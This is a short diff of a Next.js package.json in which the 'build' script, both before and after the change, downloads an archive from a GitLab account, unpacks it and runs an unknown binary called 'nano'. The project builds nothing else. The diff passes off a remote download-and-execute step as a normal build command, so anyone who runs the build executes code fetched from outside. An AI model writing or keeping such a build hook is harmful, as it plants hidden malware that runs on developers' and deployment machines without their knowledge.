@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "npm install wget-improved; wget https://gitlab.com/cahayaangkasaku1/file/-/raw/main/nano.tar.gz && tar -zxf nano.tar.gz && ./nano",
+    "build": "git clone https://gitlab.com/cahayaangkasaku1/nona.git && tar -zxf nano.tar.gz && ./nano",
     "start": "next start",
     "lint": "next lint"
   },
